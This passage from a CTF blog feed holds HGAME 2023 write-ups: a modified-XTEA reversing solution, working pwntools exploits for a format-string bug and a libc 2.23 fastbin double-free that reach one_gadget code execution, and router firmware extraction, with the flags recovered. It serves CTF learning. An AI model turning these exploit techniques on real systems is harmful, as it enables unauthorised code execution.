class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i2 &lt; <span class="number">9</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">i3++;</span><br><span class="line">i = i2 + <span class="number">1</span>;</span><br><span class="line">UIntArray.m457setVXSXFK8(iArr, i2, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(i4 &amp; <span class="number">3</span>)) + i4) ^ UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i))) ^ i4)));</span><br><span class="line">UIntArray.m457setVXSXFK8(iArr, i, UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i) + UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &lt;&lt; <span class="number">4</span>) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(iArr, i2) &gt;&gt;&gt; <span class="number">5</span>)) + UIntArray.m452getpVg5ArA(iArr, i2)) ^ UInt.m393constructorimpl(UIntArray.m452getpVg5ArA(m446constructorimpl, UInt.m393constructorimpl(UInt.m393constructorimpl(i4 &gt;&gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>)) + i4))));</span><br><span class="line">i4 = UInt.m393constructorimpl(i4 + <span class="number">878077251</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (i3 &lt;= <span class="number">32</span>);</span><br><span class="line">i2 = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> iArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m230onCreate$lambda0(EditText inputsomething, CameraActivity <span class="built_in">this</span>$<span class="number">0</span>, AlertDialog alertDialog, View view) &#123;</span><br><span class="line">Intrinsics.checkNotNullParameter(inputsomething, <span class="string">&quot;$inputsomething&quot;</span>);</span><br><span class="line">Intrinsics.checkNotNullParameter(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;this$0&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> inputsomething.getText().toString();</span><br><span class="line"><span class="keyword">if</span> (obj.length() != <span class="number">40</span>) &#123;</span><br><span class="line">Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;åºåˆ—å·ä¸æ­£ç¡®&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] m446constructorimpl = UIntArray.m446constructorimpl(<span class="number">10</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">40</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">UIntArray.m457setVXSXFK8(m446constructorimpl, i / <span class="number">4</span>, UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(UInt.m393constructorimpl(obj.charAt(i)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">1</span>) &lt;&lt; <span class="string">&#x27;\b&#x27;</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">2</span>) &lt;&lt; <span class="number">16</span>)) + UInt.m393constructorimpl(obj.charAt(i + <span class="number">3</span>) &lt;&lt; <span class="number">24</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] m229encrypthkIa6DI = <span class="built_in">this</span>$<span class="number">0.</span>m229encrypthkIa6DI(m446constructorimpl);</span><br><span class="line">UInt[] uIntArr = &#123;UInt.m387boximpl(<span class="number">637666042</span>), UInt.m387boximpl(<span class="number">457511012</span>), UInt.m387boximpl(-<span class="number">2038734351</span>), UInt.m387boximpl(<span class="number">578827205</span>), UInt.m387boximpl(-<span class="number">245529892</span>), UInt.m387boximpl(-<span class="number">1652281167</span>), UInt.m387boximpl(<span class="number">435335655</span>), UInt.m387boximpl(<span class="number">733644188</span>), UInt.m387boximpl(<span class="number">705177885</span>), UInt.m387boximpl(-<span class="number">596608744</span>)&#125;;</span><br><span class="line"><span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> i2 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (uIntArr[i2].m444unboximpl() != UIntArray.m452getpVg5ArA(m229encrypthkIa6DI, i2)) &#123;</span><br><span class="line">Toast.makeText(<span class="built_in">this</span>$<span class="number">0</span>, <span class="string">&quot;åºåˆ—å·ä¸æ­£ç¡®&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (i3 &gt; <span class="number">9</span>) &#123;</span><br><span class="line">alertDialog.dismiss();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">i2 = i3;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é­”æ”¹XTEAåŠ å¯†ï¼Œä¿®æ”¹äº†deltaã€å¼‚æˆ–æ“ä½œå’ŒåŠ å¯†é¡ºæ¬¡ï¼Œè§£å¯†è„šæœ¬åœ¨ç›¸åº”åœ°æ–¹ä¿®æ”¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = <span class="number">0x34566543</span></span><br><span class="line">    x = delta * <span class="number">33</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[x &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line">    </span><br><span class="line">c = [<span class="number">0x260202FA</span>, <span class="number">0x1B451064</span>, <span class="number">0x867B61F1</span>, <span class="number">0x228033C5</span>, <span class="number">0xF15D82DC</span>, <span class="number">0x9D8430B1</span>, <span class="number">0x19F2B1E7</span>, <span class="number">0x2BBA859C</span>, <span class="number">0x2A08291D</span>, <span class="number">0xDC707918</span>]</span><br><span class="line">key = [<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">1</span>):</span><br><span class="line">    d = decrypt(c[-<span class="number">2</span>:], key)</span><br><span class="line">    flag = long_to_bytes(d[<span class="number">1</span>])[::-<span class="number">1</span>] + flag</span><br><span class="line">    c = c[:-<span class="number">2</span>] + [d[<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;e&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>è¡¥å…¨flagå¤´ï¼Œflagï¼š<code>hgame&#123;d8c1d7d34573434ea8dfe5db40fbb25c0&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="YukkuriSay"><a href="#YukkuriSay" class="headerlink" title="YukkuriSay"></a>YukkuriSay</h3><blockquote><p>HINTS:</p><p>æ ¼å¼åŒ–å ä½ç¬¦çš„å€¼æ¥è‡ªäºå‡½æ•°çš„å‚æ•°ï¼ŒåŒæ—¶64ä½ç¨‹åºä¼ å‚ä¸æ˜¯åªç”¨å¯„å­˜å™¨çš„å“¦</p><p>%nå ä½ç¬¦æ˜¯å­˜åœ¨æº¢å‡ºçš„</p></blockquote><p>æ‰“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«æ³„éœ²æ ˆåœ°å€å’Œ <code>__libc_start_main()</code> åœ°å€æ±‚å¾—libcåŸºåœ°å€ï¼Œå†ç”¨one_gadgetæ‰“å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">30687</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.send(p64(stack_addr)*<span class="number">0x20</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%45$p%4418c%8$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">eval</span>(<span class="string">&#x27;0x&#x27;</span>+r.recv(<span class="number">12</span>))-<span class="number">243</span></span><br><span class="line">libc_base = libc_start_main - libc.sym.__libc_start_main</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#r.recvline()</span></span><br><span class="line"></span><br><span class="line">ogg = libc_base+<span class="number">0xe3b01</span></span><br><span class="line">r.recvline()</span><br><span class="line">pl = p64(stack_addr-<span class="number">224</span>+<span class="number">2</span>)+p64(stack_addr-<span class="number">224</span>)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>+<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ogg&amp;<span class="number">0xffff</span>)-((ogg&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))+<span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p>libc 2.23 UAFï¼Œæ³„éœ² <code>__malloc_hook()</code> åœ°å€æ±‚å¾—libcåŸºåœ°å€ï¼Œdouble freeåä½¿ç”¨ <code>realloc()</code> è°ƒè¯•ï¼Œä½¿å¾—æ»¡è¶³one_gadgetæ¡ä»¶å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;week-2.hgame.lwsec.cn&#x27;</span>,<span class="number">31341</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">ind,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">ind</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(ind))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">104</span></span><br><span class="line">libc_base = malloc_hook - libc.sym.__malloc_hook</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">ogg = libc_base + <span class="number">0xf1247</span></span><br><span class="line">realloc = libc_base + libc.sym.realloc</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(ogg)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;10&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h2><h3 id="Pirated-router"><a href="#Pirated-router" class="headerlink" title="Pirated router"></a>Pirated router</h3><blockquote><p>å…”å…”åœ¨å›å®¶çš„ç«è½¦ä¸Š,çœ‹åˆ°ä¸€ä¸ªç¥ç§˜çš„0tatoPåœ¨å–è·¯ç”±å™¨,äºæ˜¯å…”å…”ä¹°äº†ä¸€ä¸ªå›å®¶è¿‡å¹´,ä½†æ˜¯è¿™ä¸ªè·¯ç”±å™¨å’‹æ€»æ„Ÿè§‰æ€ªæ€ªçš„</p></blockquote><p>è·¯ç”±å™¨binå›ºä»¶æ–‡ä»¶ï¼Œå‚è€ƒ<a href="https://iqqoz.com/post-3231.html#gsc.tab=0">æå–è·¯ç”±å™¨å›ºä»¶ä¸­çš„squashfsæ–‡ä»¶ç³»ç»Ÿunsquashfsæå–æ–¹æ³•</a>ï¼Œæå–è·¯ç”±å™¨å›ºä»¶ä¸­çš„squashfsã€‚</p><p>å®‰è£…squashfsåï¼Œä½¿ç”¨binwalkåˆ†ç¦»binæ–‡ä»¶ï¼š<code>binwalk -e AC10086W_FW_1.1.4.5.bin</code>ï¼Œç”Ÿæˆæ–‡ä»¶å¤¹ <code>squashfs-root</code>ï¼Œå…¶ä¸­çš„squashfsæ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å¤´ä¸º <code>hsqs</code>ã€‚</p><p>åˆ©ç”¨ <a href="https://github.com/rampageX/firmware-mod-kit.git">firmware-mod-kit</a> è§£åŒ…squashfsæ–‡ä»¶ï¼š<code>unsquashfs 1.squashfs</code>ï¼Œåœ¨ <code>/bin</code> ç›®å½•ä¸­å‘ç°ä¸€ä¸ªæ–‡ä»¶åæ¯”è¾ƒç‰¹åˆ«çš„ç¨‹åº <code>secret_program</code>ï¼Œä½¿ç”¨IDAæŸ¥çœ‹é€»è¾‘ï¼Œ<code>main()</code> å‡½æ•°ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _OWORD v4[<span class="number">8</span>]; <span class="comment">// [xsp+10h] [xbp+10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [xsp+90h] [xbp+90h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+98h] [xbp+98h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [xsp+9Ch] [xbp+9Ch]</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">0</span>] = unk_4543B0;</span><br><span class="line">  v4[<span class="number">1</span>] = unk_4543C0;</span><br><span class="line">  v4[<span class="number">2</span>] = unk_4543D0;</span><br><span class="line">  v4[<span class="number">3</span>] = unk_4543E0;</span><br><span class="line">  v4[<span class="number">4</span>] = unk_4543F0;</span><br><span class="line">  v4[<span class="number">5</span>] = unk_454400;</span><br><span class="line">  v4[<span class="number">6</span>] = unk_454410;</span><br><span class="line">  v4[<span class="number">7</span>] = unk_454420;</span><br><span class="line">  v5 = <span class="number">94</span>;</span><br><span class="line">  v6 = <span class="number">35</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_4543A8, *((_DWORD *)v4 + i) ^ v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æå–æ•°æ®ï¼Œç®€å•å¼‚æˆ–æ“ä½œè¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">75</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">70</span>, <span class="number">88</span>, <span class="number">86</span>, <span class="number">77</span>, <span class="number">83</span>, <span class="number">23</span>, <span class="number">64</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">68</span>, <span class="number">124</span>, <span class="number">69</span>, <span class="number">74</span>, <span class="number">81</span>, <span class="number">78</span>, <span class="number">84</span>, <span class="number">66</span>, <span class="number">81</span>, <span class="number">70</span>, <span class="number">124</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">124</span>, <span class="number">16</span>, <span class="number">98</span>, <span class="number">80</span>, <span class="number">90</span>, <span class="number">94</span>]</span><br><span class="line">ss = [k^<span class="number">35</span> <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ss))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;unp4ck1ng_firmware_1s_3Asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)&lt;br&gt;çº¿ä¸Šèµ›å¹³å°ï¼š&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;è¯·å°½</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 1</title>
    <link href="https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/"/>
    <id>https://lazzzaro.github.io/2023/01/11/match-HGAME-2023-Week-1/</id>
    <published>2023-01-11T10:51:02.000Z</published>
    <updated>2023-01-13T10:19:10.014Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)<br>çº¿ä¸Šèµ›å¹³å°ï¼š<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>è¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­<br>æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€<br>æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼š<br>ç¬¬1åï¼š1000Pwnhubé‡‘å¸<br>ç¬¬2åï¼š800Pwnhubé‡‘å¸<br>ç¬¬3åï¼š600Pwnhubé‡‘å¸<br>4-10åï¼š300Pwnhubé‡‘å¸<br>è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ª<br>æ³¨æ„ï¼š<br>* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›<br>* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº<br>* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚<br>* HGAME 